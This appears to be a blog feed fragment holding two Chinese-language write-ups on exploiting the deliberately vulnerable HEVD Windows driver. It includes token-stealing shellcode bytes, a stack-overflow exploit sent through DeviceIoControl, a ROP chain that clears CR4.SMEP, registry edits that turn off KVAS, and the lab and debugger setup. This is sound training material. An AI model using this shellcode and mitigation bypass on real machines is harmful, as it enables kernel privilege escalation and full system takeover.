href="https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf">https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf</a></p><p>尝试使用调试起修改CR4</p><p><img src="https://img.joe1sn.top/uploads/big/ad5cf6efe1bb2811438dd79964396658.png" alt="image-20240118110623235" /></p><p>如果修改第20位为0，rc的值为<code>0x270678</code>，然而还是不行</p><p><img src="https://img.joe1sn.top/uploads/big/358725a8cb68d78d4f738d38b49e1997.png" alt="image-20240118131258807" /></p><h2 id="b-kvas"><a class="markdownIt-Anchor" href="#b-kvas"></a> B. KVAS</h2><p>Windows内核缓解机制使用了Kva Shadow内存，比如MeltDown漏洞就于此有关，首先不会讲细节，<strong>在下一篇文章会讲到</strong>，尝试将其关闭</p><p>再注册表<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management</code></p><p>创建两个DWORD值：<code>FeatureSettingsOverride </code>  <code>FeatureSettingsOverrideMask</code></p><p>设置值为3，然后重启</p><p><img src="https://img.joe1sn.top/uploads/big/cb9c56124685a1418f578b2fefd2f119.png" alt="image-20240118140220468" /></p><p>现在手动设置cr4.SMEP为0</p><p><img src="https://img.joe1sn.top/uploads/big/c5e4751baecdd52edb64fef20d4d2fb2.png" alt="image-20240118141040651" /></p><p>终于运行了</p><p><img src="https://img.joe1sn.top/uploads/big/75325e60ebda69029a1a5f2fcf81358e.png" alt="image-20240118141139354" /></p><p>shellcode的一些偏移有问题</p><p><img src="https://img.joe1sn.top/uploads/big/0bd6d7a7b9886ec9c78440be9a38dff5.png" alt="image-20240118142143111" /></p><p>更换为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">BYTE cmd[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>,</span><br><span class="line"><span class="number">0xc1</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xfa</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xf0</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>,</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe2</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x89</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xca</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8b</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xff</span>, <span class="number">0xc1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0x8a</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4c</span>, <span class="number">0x8b</span>, <span class="number">0x9a</span>, <span class="number">0x78</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xa2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xaa</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0xf8</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>EXP</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD oldProtect;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">LPVOID shellcode_addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,</span><br><span class="line"><span class="built_in">sizeof</span>(cmd),</span><br><span class="line">MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(shellcode_addr, cmd, <span class="built_in">sizeof</span>(cmd));</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x820</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x810</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br><span class="line"></span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;shellcode space %p\n&quot;</span>, shellcode_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Spawning a new cmd.exe process\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl,</span><br><span class="line">stackspace, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试中手动CR4.SMEP=0（注意，之前已经关闭了KVA）</p><p><img src="https://img.joe1sn.top/uploads/big/23ad38592a7a932722da80062ab27a04.png" alt="img" /></p><h2 id="c-使用内核rop绕过smep"><a class="markdownIt-Anchor" href="#c-使用内核rop绕过smep"></a> C. 使用内核ROP绕过SMEP</h2><p>首先我们需要一个类似于<code>mov rc4,xxx</code>的rop，让<code>rc4.smep=0</code>，</p><p>参考在Linux下进行ROP的经验， payload大致长这样的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)pop_rcx_ret;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x820</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x00000000002506f8</span>;<span class="comment">//set RCX = currentRC4</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x828</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)mov_rc4_rcx_ret;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x830</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br></pre></td></tr></table></figure><p>多调试或者编程自动寻找就可以找到了，这里暂时参考<a href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/#">HEVD Exploits – Windows 10 x64 Stack Overflow SMEP Bypass</a></p><p><img src="https://img.joe1sn.top/uploads/big/8de0787e2e202779fce475c08efcd7d0.png" alt="image-20240118154417340" /></p><p><img src="https://img.joe1sn.top/uploads/big/18ad7dc78e36b58f6d1df6045768734e.png" alt="image-20240118154352984" /></p><p>修改EXP</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x840</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x810</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0xfffff807743f52c0</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x820</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x00000000002506f8</span>;<span class="comment">//set RCX = currentRC4</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x828</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0xfffff807749a41cf</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x830</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start set ROP\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>没有下断点直接过</p><p><img src="https://img.joe1sn.top/uploads/big/263f646ca04327e676129e83d9178406.png" alt="image-20240118154931459" /></p><p><img src="https://img.joe1sn.top/uploads/big/068bbb9c644915e678b8edb21063071b.png" alt="image-20240118154854993" /></p><h1 id="遗留"><a class="markdownIt-Anchor" href="#遗留"></a> 遗留</h1><p>下一篇</p><ul><li>user编程寻找ROPGadget</li><li>shellcode编写</li><li>Token提权</li><li>KVAS</li></ul><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://www.bilibili.com/video/BV1pD4y1a7hP/">https://www.bilibili.com/video/BV1pD4y1a7hP/</a></p><p><a href="https://www.cnblogs.com/XiuzhuKirakira/p/16995784.html">https://www.cnblogs.com/XiuzhuKirakira/p/16995784.html</a></p><p><a href="https://blog.xpnsec.com/hevd-stack-overflow">https://blog.xpnsec.com/hevd-stack-overflow</a></p><p><a href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit">https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit</a></p><p><a href="https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10">https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10</a></p><p><a href="https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/">https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/</a></p><p><a href="https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf">https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf</a></p><p><a href="https://wumb0.in/windows-10-kvas-and-software-smep.html">https://wumb0.in/windows-10-kvas-and-software-smep.html</a></p><p><a href="https://github.com/xct/windows-kernel-exploits/">https://github.com/xct/windows-kernel-exploits/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在&lt;a href=&quot;&quot;&gt;上一篇&lt;/a&gt;中了解了与内核的交互模式，这里就可以开始做HEVD了&lt;/p&gt;
&lt;p&gt;文章已在先知社区投稿：&lt;a href=&quot;https://xz.aliyun.com/t/13364&quot;&gt;https://xz.aliyun.com/t/13364&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】HEVD-内核栈溢出(上)</title>
    <link href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/"/>
    <id>https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/</id>
    <published>2024-01-25T07:07:29.000Z</published>
    <updated>2024-02-24T03:51:35.023Z</updated>
    
    <content type="html"><![CDATA[<p>开始做HEVD来熟悉windows的内核漏洞利用方式时，发现大多数的资料依旧基于windows7，但是目前主流的操作系统已经是win10，所以还是得更上时代潮流的</p><p>文章已在先知社区投稿：<a href="https://xz.aliyun.com/t/13363">https://xz.aliyun.com/t/13363</a></p><span id="more"></span><h1 id="0-前置环境"><a class="markdownIt-Anchor" href="#0-前置环境"></a> 0. 前置环境</h1><p>更基础</p><ul><li>WIndows10 Vmware虚拟机</li><li>Visual Studio 2019，有WDK</li><li>Windbg Preview（我用单纯是觉得更好看）</li><li>最重要的HEVD项目：<a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver%EF%BC%8C%E6%88%91%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E7%9A%843.00">https://github.com/hacksysteam/HackSysExtremeVulnerableDriver，我直接下载的3.00</a> Release版</li></ul><p>我使用的Windows版本是</p><p><img src="https://img.joe1sn.top/uploads/big/a8c845560178af29a6b56e36c93a49cd.png" alt="image-20240122113406037" /></p><h2 id="i-编程环境"><a class="markdownIt-Anchor" href="#i-编程环境"></a> I. 编程环境</h2><p><strong>如果你想快速搭建一个驱动开发环境可以参考B站上的一些资料</strong>，如：<a href="https://www.bilibili.com/video/BV1wY4y1n77F">配置驱动开发环境</a><br />如果按照步骤vs没有<code>KernelModDriver</code>这一模板，找到vs目录的<code>WDK.vsix</code>双击即可</p><p>一段驱动的主要代码，在<code>main.cpp</code>中编写</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;win10.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;x64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function"><span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(DriverObject);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Driver Stopping -&gt; %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(RegistryPath);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Driver Running -&gt; %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>规定了驱动加载和卸载的两个函数，并在加载和卸载时打印调试信息</p><p><img src="https://img.joe1sn.top/uploads/big/16686bd3cbe47610118773f7164f62db.png" alt="image-20240122115841033" /></p><h2 id="ii-调试环境"><a class="markdownIt-Anchor" href="#ii-调试环境"></a> II. 调试环境</h2><h3 id="传统串口调试"><a class="markdownIt-Anchor" href="#传统串口调试"></a> 传统串口调试</h3><p>添加串口</p><img src="https://img.joe1sn.top/uploads/big/39f90005ffe45efbba9a7140e740fee8.png" alt="image-20240115212926345" style="zoom:50%;" /><p>在虚拟机中Win+R召唤<code>msconfig</code>，打开允许串口调试</p><p><img src="https://img.joe1sn.top/uploads/big/78fe2217e7b7b00cfa98a27a83058a01.png" alt="image-20240122114955532" /></p><p>然后在（记得用管理员打开）windbg中按照图中配置即可，其他选项不变</p><p><img src="https://img.joe1sn.top/uploads/big/5b31856f65b981c015c5f5fff5b6b725.png" alt="image-20240122115049006" /></p><p>一直找不到管道的话可以点Break再等会儿就有了</p><p><img src="https://img.joe1sn.top/uploads/big/19d75ecb2fd8950a1a8aba7d70805748.png" alt="img" /></p><h3 id="virtualkd法调试"><a class="markdownIt-Anchor" href="#virtualkd法调试"></a> VirtualKD法调试</h3><p>项目链接：<a href="http://virtualkd.sysprogs.org/">http://virtualkd.sysprogs.org/</a></p><p>安装后，<code>vmmon64.exe</code>就行了</p><p>但是用了就不能用串口调试了</p><p><img src="https://img.joe1sn.top/uploads/big/9c72b6b964eb66c0a1d5e7f45d2a51fc.png" alt="image-20240115222104521" /></p><h3 id="打开信息显示dbgview"><a class="markdownIt-Anchor" href="#打开信息显示dbgview"></a> 打开信息显示+DbgView</h3><p>在<code>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\</code>注册表中添加<code>Debug Print Filter</code>，并设置一个<code>Default</code>的<code>DWORD</code>值，你可以将其设置为<code>0x8</code>或者允许更多调试信息的<code>0xf</code></p><p><img src="https://img.joe1sn.top/uploads/big/a71e3dc209c383a939308d3d49b272b0.png" alt="image-20240122114737436" /></p><p>虽然说windbg确实能打印出<code>DbgPrint</code>，但是HEVD使用的是<code>DbgPrintEx</code>，接受不到，安装了DbgView后，他会把调试信息打印出了并且windbg也能收到</p><p><img src="https://img.joe1sn.top/uploads/big/09c9ac07d589f67f1b6fad3b678172e4.png" alt="image-20240122113922891" /></p><h3 id="调试指令"><a class="markdownIt-Anchor" href="#调试指令"></a> 调试指令</h3><p>如果出现了以下情况且虚拟机卡顿，可以使用这两个指令关闭输出</p><p><img src="https://img.joe1sn.top/uploads/big/33f118ae586f66d022e74847ca034c38.png" alt="image-20240122114457173" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; ed nt!Kd_SXS_Mask 0</span><br><span class="line">1: kd&gt; ed nt!Kd_FUSION_Mask 0</span><br></pre></td></tr></table></figure><p><strong>关闭这两个函数的输出，莫名其妙变卡的话再用一下</strong></p><h2 id="iii-驱动加载"><a class="markdownIt-Anchor" href="#iii-驱动加载"></a> III. 驱动加载</h2><p>使用KmdManager.exe，毛子的黑科技，使用时需要管理员启动</p><p>也可以使用osLoader啥的</p><p>这里用KmdKit的KmdManager演示，运行HEVD</p><p><img src="https://img.joe1sn.top/uploads/big/54dbab58e1a08495d2692e00e28164ee.png" alt="image-20240115234008160" /></p><p><img src="https://img.joe1sn.top/uploads/big/5c22ef7ea1a4180500ef95fa027a1ecc.png" alt="image-20240117111218338" /></p><p>那么就算搭建成功</p><h1 id="a-编程基础"><a class="markdownIt-Anchor" href="#a-编程基础"></a> A. 编程基础</h1><p>关于内核模式驱动程序：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/</a></p><p>内核中交互是通过<code>IRP</code>请求进行交互的</p><blockquote><p><strong>IRP</strong> 结构是表示 <em>I/O 请求数据包</em>的部分不透明结构。 <strong>IRP</strong> 结构的未记录成员是保留的，仅由 I/O 管理器使用，在某些情况下，由文件系统驱动程序 (FSD) 使用。</p></blockquote><p>MSDN：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp</a></p><p>使用到的内存堆栈为<code>I/O Stack</code></p><blockquote><p>I/O 管理器为分层驱动程序链中的每个驱动程序提供其设置的每个 IRP 的 I/O 堆栈位置。 每个 I/O 堆栈位置都包含 <strong>一个IO_STACK_LOCATION</strong>结构。</p></blockquote><p>MSDN：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/i-o-stack-locations">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/i-o-stack-locations</a></p><p><img src="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/images/2irpios.png" alt="说明 irp 中 i/o 堆栈位置的内容的示意图。" /></p><p>IRP通过iostack发送给设备，对应的是应用层的“消息”。设备可以存在（硬盘等），也可以不存在（QQ Protect驱动等）。</p><p>根据上图，应用层通过和设备对象（FDO）进行交互，设备（PDO）再和设备对象交互，实现交互。同时FDO向PDO的交互不是必要的。</p><blockquote><h2 id="hal-硬件抽象层"><a class="markdownIt-Anchor" href="#hal-硬件抽象层"></a> HAL 硬件抽象层</h2><p>HAL通常是一个独立的动态链接库，windows自身携带多种HAL，但是在系统安装的时候只会选择一种，名为<code>hal.dll</code>。涉及中断控制器、单处理器/多处理器硬件断点。</p></blockquote><p><img src="https://img.joe1sn.top/uploads/big/1e87772ff6bc6d7cc688242870d4b527.png" alt="image-20240116133826071" /></p><h1 id="b-代码"><a class="markdownIt-Anchor" href="#b-代码"></a> B. 代码</h1><p><img src="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/images/driverfunctionpointers01.png" alt="图：driver-object 结构中的函数指针。" /></p><h3 id="创建设备"><a class="markdownIt-Anchor" href="#创建设备"></a> 创建设备</h3><p>MSDN：<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/device-tree">https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/device-tree</a></p><p>使用DeviceTree，可以找到：<a href="https://web.archive.org/web/20200519214156/http://www.osronline.com/OsrDown.cfm/devicetree_v230.zip">https://web.archive.org/web/20200519214156/http://www.osronline.com/OsrDown.cfm/devicetree_v230.zip</a></p><p><img src="https://img.joe1sn.top/uploads/big/7e44caefc4f0dd8b3fb72d5422ace35f.png" alt="image-20240116141544394" /></p><figure class="highlight 